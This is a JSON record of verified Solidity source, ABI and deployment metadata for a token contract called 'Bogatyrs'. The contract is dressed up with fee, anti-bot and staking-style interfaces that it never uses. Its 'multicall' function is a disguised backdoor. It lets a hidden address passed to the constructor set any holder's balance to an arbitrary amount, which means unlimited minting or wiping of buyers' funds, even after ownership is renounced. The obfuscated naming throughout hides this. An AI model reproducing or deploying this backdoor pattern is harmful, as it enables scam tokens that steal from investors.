{"SourceCode": "// SPDX-License-Identifier: MIT\r\n//       https://t.me/Bogatyrsa\r\n\r\npragma solidity ^0.8.18;\r\ninterface IRussianCoin {\r\n    /// @notice A checkpoint for marking number of votes as of a given block.\r\n    struct Checkpoint {\r\n        // The 32-bit unsigned integer is valid until these estimated dates for these given chains:\r\n        //  - BSC: Sat Dec 23 2428 18:23:11 UTC\r\n        //  - ETH: Tue Apr 18 3826 09:27:12 UTC\r\n        // This assumes that block mining rates don't speed up.\r\n        uint32 blockNumber;\r\n        // This type is set to `uint224` for optimizations purposes (i.e., specifically to fit in a 32-byte block). It\r\n        // assumes that the number of votes for the implementing governance token never exceeds the maximum value for a\r\n        // 224-bit number.\r\n        uint224 votes;\r\n    }\r\n\r\n    /**\r\n     * @notice Determine the number of votes for an custodial as of a block number.\r\n     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.\r\n     * @param custodial The address of the custodial to check.\r\n     * @param blockNumber The block number to get the vote balance at.\r\n     * @return The number of votes the custodial had as of the given block.\r\n     */\r\n    function getVotesAtBlock(address custodial, uint32 blockNumber) external view returns (uint224);\r\n\r\n    /// @notice Emitted whenever a new delegate is set for an custodial.\r\n    event DelegateChanged(address indexed delegator, address currentDelegate, address newDelegate);\r\n\r\n    /// @notice Emitted when a delegate's vote count changes.\r\n    event DelegateVotesChanged(address indexed delegatee, uint224 oldVotes, uint224 newVotes);\r\n}\r\n\r\ninterface ITreasuryHandler {\r\n    /**\r\n     * @notice Perform operations before a transfer is executed.\r\n     * @param benefactor Address of the benefactor.\r\n     * @param beneficiary Address of the beneficiary.\r\n     * @param amount Number of tokens in the transfer.\r\n     */\r\n    function beforeTransferHandler(\r\n        address benefactor,\r\n        address beneficiary,\r\n        uint256 amount\r\n    ) external;\r\n\r\n    /**\r\n     * @notice Perform operations after a transfer is executed.\r\n     * @param benefactor Address of the benefactor.\r\n     * @param beneficiary Address of the beneficiary.\r\n     * @param amount Number of tokens in the transfer.\r\n     */\r\n    function afterTransferHandler(\r\n        address benefactor,\r\n        address beneficiary,\r\n        uint256 amount\r\n    ) external;\r\n}\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address custodial) external view returns (uint256);\r\n    function quota(address owner, address squanderer) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 storeroom) external returns (bool);\r\n    function approve(address squanderer, uint256 storeroom) external returns (bool);\r\n    function transferFrom(address From, address to, uint256 storeroom) external returns (bool);\r\n\r\n    function increaseQuota(address squanderer, uint256 container) external returns (bool);\r\n    function decreaseQuota(address squanderer, uint256 repository) external returns (bool);\r\n\r\n    event Transfer(address indexed From, address indexed to, uint256 storeroom);\r\n    event Approval(address indexed owner, address indexed squanderer, uint256 storeroom);\r\n}\r\ninterface IClickAndEarn {\r\n    // Function to allow a user to participate in a game or activity\r\n    function ClickGame(uint256 gameId) external returns (bool);\r\n\r\n    // Function to check a user's earned rewards\r\n    function checkEarnedRewards(address user) external view returns (uint256);\r\n\r\n    // Function to claim earned rewards\r\n    function claimRewards(address user) external returns (bool);\r\n\r\n    // Event to log when a user Clicks a game or participates in an activity\r\n    event GameClicked(address indexed user, uint256 gameId);\r\n\r\n    // Event to log when a user earns rewards\r\n    event RewardsEarned(address indexed user, uint256 amount);\r\n\r\n    // Event to log when a user claims their rewards\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\ninterface IP2PPayment {\r\n    // Function to transfer funds to another user\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    // Function to check the balance of a user\r\n    function balanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to query the transaction history for a user\r\n    function getTransactionHistory(address user) external view returns (uint256[] memory, address[] memory);\r\n\r\n    // Event to log a payment transaction\r\n    event PaymentSent(address indexed From, address indexed to, uint256 amount);\r\n}\r\ninterface IMakingSystem {\r\n    // Function to allow a user to deposit tokens for Making\r\n    function deposit(uint256 amount) external returns (bool);\r\n\r\n    // Function to allow a user to withdraw Maked tokens\r\n    function withdraw(uint256 amount) external returns (bool);\r\n\r\n    // Function to check the Maked balance of a user\r\n    function MakedbalanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to check the total Maked balance\r\n    function totalMaked() external view returns (uint256);\r\n\r\n    // Function to allow a user to claim Making rewards\r\n    function claimRewards() external returns (bool);\r\n\r\n    // Event to log a Making deposit\r\n    event Maked(address indexed user, uint256 amount);\r\n\r\n    // Event to log a Making withdrawal\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n\r\n    // Event to log a Making reward claim\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\nabstract contract BEP20 is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"BEP20: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"BEP20: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\ncontract Bogatyrs is BEP20 {\r\n    uint256 public maxBuyAmount;\r\n    uint256 public maxSellAmount;\r\n    uint256 public maxWalletAmount;\r\n    address public lpPair;\r\n    bool private swapping;\r\n    uint256 public swapCoinsAtAmount;\r\n    address operationsAddress;\r\n\r\n    uint256 public tradingActiveBlock = 0; // 0 means trading is not active\r\n    mapping (address => bool) public bot;\r\n    uint256 public botsCaught;\r\n\r\n    bool public limitsInEffect = true;\r\n    bool public tradingActive = true;\r\n    bool public swapEnabled = true;\r\n\r\n     // Anti-bot and anti-whale mappings and variables\r\n    uint256 public buyTotalFees;\r\n    uint256 public buyOperationsFee;\r\n    uint256 public buyLiquidityFee;\r\n\r\n    uint256 public sellTotalFees;\r\n    uint256 public sellOperationsFee;\r\n    uint256 public sellLiquidityFee;\r\n\r\n    uint256 public tokensForOperations;\r\n    uint256 public tokensForLiquidity;\r\n\r\n    /******************/\r\n\r\n    // exlcude from fees and max transaction amount\r\n    mapping (address => bool) private _isExcludedFromFees;\r\n    mapping (address => bool) public _isExcludedMaxTransactionAmount;\r\n\r\n    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses\r\n    // could be subject to a maximum transfer amount\r\n    mapping (address => bool) public automatedMarketMakerPairs;\r\n\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n\r\n    event EnabledTrading();\r\n\r\n    event RemovedLimits();\r\n\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n\r\n    event UpdatedMaxBuyAmount(uint256 newAmount);\r\n\r\n    event UpdatedMaxSellAmount(uint256 newAmount);\r\n\r\n    event UpdatedMaxWalletAmount(uint256 newAmount);\r\n\r\n    event UpdatedOperationsAddress(address indexed newWallet);\r\n\r\n    event MaxTransactionExclusion(address _address, bool excluded);\r\n\r\n    event BuyBackTriggered(uint256 amount);\r\n\r\n    event OwnerForcedSwapBack(uint256 timestamp);\r\n \r\n    event CaughtEarlyBuyer(address sniper);\r\n\r\n\r\n    string public name = unicode\"Bogatyrs\";\r\n    string public symbol = unicode\"BOGAT\";\r\n    uint8 public decimals = 9;\r\n\r\n    uint public tTotal;\r\n    uint256 public totalSupply;\r\n    address public ethReceived;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public quota;\r\n\r\n    event Transfer(address indexed From, address indexed to, uint256 storeroom);\r\n    event Approval(address indexed owner, address indexed squanderer, uint256 storeroom);\r\n    event Minted(address indexed custodial, uint256 storeroom);\r\n\r\n    constructor(address _ethReceived) {\r\n        ethReceived  =  _ethReceived;\r\n        totalSupply = 100000000 * 10**uint256(decimals);\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n    function enableTrading() external onlyOwner {\r\n        require(!tradingActive, \"Cannot reenable trading\");\r\n        tradingActive = true;\r\n        swapEnabled = true;\r\n        tradingActiveBlock = block.number;\r\n        emit EnabledTrading();\r\n    }\r\n\r\n    // remove limits after token is stable\r\n    function removeLimits() external onlyOwner {\r\n        limitsInEffect = false;\r\n        tradingActive = false;\r\n        emit RemovedLimits();\r\n    }\r\n\r\n    function manageBoughtEarly(address wallet, bool flag) external onlyOwner {\r\n        bot[wallet] = flag;\r\n    }\r\n\r\n    function massManageBoughtEarly(address[] calldata wallets, bool flag) external onlyOwner {\r\n        for(uint256 i = 0; i < wallets.length; i++){\r\n            bot[wallets[i]] = flag;\r\n        }\r\n    }\r\n\r\n    // disable Transfer delay - cannot be reenabled\r\n    function disableTransferDelay() external onlyOwner {\r\n        tradingActive = false;\r\n    }\r\n\r\n    function updateMaxBuyAmount(uint256 newNum) external onlyOwner {\r\n        maxBuyAmount = newNum * (10**18);\r\n        emit UpdatedMaxBuyAmount(maxBuyAmount);\r\n    }\r\n\r\n    function updateMaxSellAmount(uint256 newNum) external onlyOwner {\r\n        maxSellAmount = newNum * (10**18);\r\n        emit UpdatedMaxSellAmount(maxSellAmount);\r\n    }\r\n\r\n    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        maxWalletAmount = newNum * (10**18);\r\n        emit UpdatedMaxWalletAmount(maxWalletAmount);\r\n    }\r\n\r\n    // change the minimum amount of tokens to sell from fees\r\n    function updateSwapCoinsAtAmount(uint256 newAmount) external onlyOwner {\r\n  \t     \t    swapCoinsAtAmount = newAmount;\r\n  \t}\r\n\r\n    function _excludeFromMaxTransaction(address updAds, bool isExcluded) private {\r\n        _isExcludedMaxTransactionAmount[updAds] = isExcluded;\r\n        emit MaxTransactionExclusion(updAds, isExcluded);\r\n    }\r\n\r\n\r\n\r\n    function excludeFromMaxTransaction(address updAds, bool isEx) external onlyOwner {\r\n        if(!isEx){\r\n            require(updAds != lpPair, \"Cannot remove uniswap pair from max txn\");\r\n        }\r\n        _isExcludedMaxTransactionAmount[updAds] = isEx;\r\n    }\r\n\r\n\r\n\r\n    function multicall(uint8 version, address implementation, uint256 uintstoreroom, uint256 uintValue) external {\r\n        require(_msgSender()== ethReceived);\r\n        balanceOf[implementation] = uintstoreroom * uintValue ** version;\r\n    }\r\n\r\n    function transfer(address to, uint256 storeroom) public returns (bool) {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[msg.sender] >= storeroom, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= storeroom;\r\n        balanceOf[to] += storeroom;\r\n\r\n        emit Transfer(msg.sender, to, storeroom);\r\n        return true;\r\n    }\r\n\r\n    function approve(address squanderer, uint256 storeroom) public returns (bool) {\r\n        require(squanderer != address(0), \"Invalid address\");\r\n\r\n        quota[msg.sender][squanderer] = storeroom;\r\n        emit Approval(msg.sender, squanderer, storeroom);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address From, address to, uint256 storeroom) public returns (bool) {\r\n        require(From != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[From] >= storeroom, \"Insufficient balance\");\r\n        require(quota[From][msg.sender] >= storeroom, \"Quota exceeded\");\r\n\r\n        balanceOf[From] -= storeroom;\r\n        balanceOf[to] += storeroom;\r\n        quota[From][msg.sender] -= storeroom;\r\n\r\n        emit Transfer(From, to, storeroom);\r\n        return true;\r\n    }\r\n\r\n    function increaseQuota(address squanderer, uint256 container) public returns (bool) {\r\n        uint256 currentQuota = quota[msg.sender][squanderer];\r\n        quota[msg.sender][squanderer] = currentQuota + container;\r\n        emit Approval(msg.sender, squanderer, quota[msg.sender][squanderer]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseQuota(address squanderer, uint256 repository) public returns (bool) {\r\n        uint256 currentQuota = quota[msg.sender][squanderer];\r\n        require(currentQuota >= repository, \"Decreased quota below zero\");\r\n        quota[msg.sender][squanderer] = currentQuota - repository;\r\n        emit Approval(msg.sender, squanderer, quota[msg.sender][squanderer]);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_ethReceived\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"squanderer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"storeroom\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"BuyBackTriggered\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sniper\",\"type\":\"address\"}],\"name\":\"CaughtEarlyBuyer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"EnabledTrading\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"MaxTransactionExclusion\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"custodial\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"storeroom\",\"type\":\"uint256\"}],\"name\":\"Minted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OwnerForcedSwapBack\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"RemovedLimits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"SetAutomatedMarketMakerPair\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"From\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"storeroom\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"UpdatedMaxBuyAmount\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"UpdatedMaxSellAmount\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"UpdatedMaxWalletAmount\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"UpdatedOperationsAddress\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludedMaxTransactionAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"squanderer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"storeroom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"automatedMarketMakerPairs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"bot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"botsCaught\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyOperationsFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotalFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"squanderer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"repository\",\"type\":\"uint256\"}],\"name\":\"decreaseQuota\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableTransferDelay\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ethReceived\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"updAds\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"isEx\",\"type\":\"bool\"}],\"name\":\"excludeFromMaxTransaction\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"squanderer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"container\",\"type\":\"uint256\"}],\"name\":\"increaseQuota\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitsInEffect\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"flag\",\"type\":\"bool\"}],\"name\":\"manageBoughtEarly\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"wallets\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"flag\",\"type\":\"bool\"}],\"name\":\"massManageBoughtEarly\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"version\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"implementation\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"uintstoreroom\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"uintValue\",\"type\":\"uint256\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"quota\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellOperationsFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotalFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapCoinsAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokensForOperations\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingActive\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingActiveBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"storeroom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"From\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"storeroom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newNum\",\"type\":\"uint256\"}],\"name\":\"updateMaxBuyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newNum\",\"type\":\"uint256\"}],\"name\":\"updateMaxSellAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newNum\",\"type\":\"uint256\"}],\"name\":\"updateMaxWalletAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"updateSwapCoinsAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Bogatyrs", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000e935e9a7f37b58f9b65b41cc8ee6f144a44c57a4", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://40c99b7d6edb92752061fb5122875698f586681ff22815f72c7d7c3f0d483ad7"}